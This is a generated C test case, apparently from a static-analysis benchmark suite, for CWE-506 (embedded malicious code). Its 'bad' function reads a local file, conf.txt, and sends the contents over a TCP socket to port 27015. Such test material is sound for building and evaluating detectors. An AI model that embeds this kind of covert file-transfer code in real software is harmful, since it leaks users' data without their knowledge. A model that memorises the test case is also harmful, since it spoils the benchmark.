/* TEMPLATE GENERATED TESTCASE FILE
Filename: CWE506_Embedded_Malicious_Code__file_transfer_connect_socket_01.c
Label Definition File: CWE506_Embedded_Malicious_Code__file_transfer.badonly.label.xml
Template File: point-flaw-badonly-01.tmpl.c
*/
#include "std_testcase.h"
#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <direct.h>
#pragma comment(lib, "ws2_32")
#define CLOSE_SOCKET closesocket
#else
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define CLOSE_SOCKET close
#define SOCKET int
#endif
#define TCP_PORT 27015
#define FILENAME "conf.txt"

#ifndef OMITBAD
static void readContents(char *contents, int capacity)
{
    FILE *stream = fopen(FILENAME, "r");
    /* A missing file must not cause strlen to read uninitialized storage. */
    contents[0] = '\0';
    if (stream == NULL) { return; }
    if (fgets(contents, capacity, stream) == NULL)
    {
        printLine("fgets() failed");
        contents[0] = '\0';
    }
    fclose(stream);
}

void CWE506_Embedded_Malicious_Code__file_transfer_connect_socket_01_bad()
{
    SOCKET connection = INVALID_SOCKET;
    struct sockaddr_in service;
    char contents[65536];
    size_t length;
#ifdef _WIN32
    WSADATA wsaData;
    int initialized = 0;
#endif
    readContents(contents, (int)sizeof(contents) - 1);
    length = strlen(contents);
    do
    {
#ifdef _WIN32
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != NO_ERROR) { break; }
        initialized = 1;
#endif
        connection = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (connection == INVALID_SOCKET) { break; }
        memset(&service, 0, sizeof(service));
        service.sin_family = AF_INET;
        service.sin_addr.s_addr = INADDR_ANY;
        service.sin_port = htons(TCP_PORT);
        if (connect(connection, (struct sockaddr *)&service, sizeof(service)) == SOCKET_ERROR) { break; }
        if (send(connection, contents, (int)length, 0) != (int)length) { break; }
    } while (0);
    if (connection != INVALID_SOCKET) { CLOSE_SOCKET(connection); }
#ifdef _WIN32
    if (initialized) { WSACleanup(); }
#endif
}
#endif
#ifdef INCLUDEMAIN
int main(int argc, char *argv[])
{
    srand((unsigned)time(NULL));
#ifndef OMITBAD
    printLine("Calling bad()...");
    CWE506_Embedded_Malicious_Code__file_transfer_connect_socket_01_bad();
    printLine("Finished bad()");
#endif
    return 0;
}
#endif
